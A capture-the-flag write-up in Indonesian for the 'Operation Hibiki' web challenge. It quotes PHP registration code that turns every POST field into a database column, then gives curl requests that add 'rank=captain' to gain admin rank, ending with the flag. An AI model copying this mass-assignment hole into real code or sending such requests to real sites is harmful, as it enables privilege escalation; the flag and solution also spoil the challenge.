# __ASGama CTF__ 
## _Operation Hibiki_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Web | 125 | l0l

**Description:** 

> Bahaya komandan, kapal perang pendjadjah sebentar lagi akan berlabuh di laut selatan. Kita harus bisa mengambil alih kapal tersebut, untungnya kami berhasil menyusup ke jaringan internal kapal pendjadjah hibiki dan mencuri source code panel komando kapal tersebut. Akan tetapi kami masih tidak bisa mengambil alih karena tidak punya akses sebagai admin. Dapatkah kamu meretasnya ?
> 
> http://gamactf.asgama.web.id:41002/login.php
> 
> [OperationHibiki](./Operation_Hibiki_source.zip)


### Operation Hibiki
Diberikan sebuah service yang mengharuskan kita untuk login sebagai admin.
[login_proc]
```php
    if(isset($_POST["username"])){

        $username = $_POST["username"];
        $password = $_POST["password"];

        $stmt = $conn->prepare("select * from users where username=:username and password=:password");
        $stmt->bindParam(":username", $username);
        $stmt->bindParam(":password", $password);
        $stmt->execute();

        $user = $stmt->fetch();

        if(!$user){
            die("Username/Password Salah");
        }

        if($user["rank"] === "captain"){
            echo "Welcome captain, here your flacc: ### BENDERANYA DISINI YA GAN HEHEHE ###";
        }else{
            echo "Welcome hibiki member";
        }

 
    }else{
        echo "PERGI WOE HEKEL !!!";
    }
```

Tidak ada celah SQL Injection disini karena service tersebut menggunakan prepared statement. Namun yang menarik adalah pada bagian  
```php
if($user["rank"] === "captain"){
            echo "Welcome captain, here your flacc: ### BENDERANYA DISINI YA GAN HEHEHE ###";
        }
```

Yang berarti kita harus login sebagai user yang memiliki `rank` captain. Berarti di dalam database table user terdapat kolom "rank"  
Sekarang kita cek source code untuk registrasi.

[register_proc]
```php
<?php

    include "core/koneksi.php";

    function filter($string){
        return preg_replace("/[^a-zA-Z]/", "", $string);
    }

    if(isset($_POST["username"])){

        $columns = "";
        $values = "";

        foreach($_POST as $key => $value){
            $columns .= filter($key) . ",";
            $values .= "'" . filter($value) . "',";
        }

        $columns = substr($columns, 0, -1);
        $values = substr($values, 0, -1);

        $stmt = $conn->prepare("insert into users ($columns) values ($values)");


        if($stmt->execute()){
            echo "Registrasi Sukses, <a href='login.php'>Login</a>";
        }else{
            echo "Registrasi Gagal/Username telah terpakai, <a href='register.php'>Back</a>";
        }

    }else{
        echo "PERGI WOE HEKEL !!!";
    }

?>
```

Di sini terlihat bahwa hanya dilakukan pengecekan apakah ada data $_POST['username']. Selebihnya semua variable dalam $_POST akan diekstrak menjadi pasangan column-value sebagai query untuk database.

Dari sini terlihat bahwa kita dapat melakukan injeksi pada $_POST dengan menambahkan kolom "rank" dengan value "captain" untuk mendapatkan user dengan rank captain.


### Payload
1. Register user  
```
curl -X POST -d "username=testestest&password=testestest&rank=captain" http://gamactf.asgama.web.id:41002/register_proc.php
```

2. Login
```
curl -X POST -d "username=testestest&password=testestest&rank=captain" http://gamactf.asgama.web.id:41002/login_proc.php
```

### Result
1. Setelah register
```
curl -X POST -d "username=testestest&password=testestest&rank=captain" http://gamactf.asgama.web.id:41002/register_proc.php
Registrasi Sukses, <a href='login.php'>Login</a>
```

2. Setelah login
```
 curl -X POST -d "username=testestest&password=testestest" http://gamactf.asgama.web.id:41002/login_proc.php 
Welcome captain, here your flacc: GamaCTF{destroyer_is_better_than_battleship}
```

### Flag
GamaCTF{destroyer_is_better_than_battleship}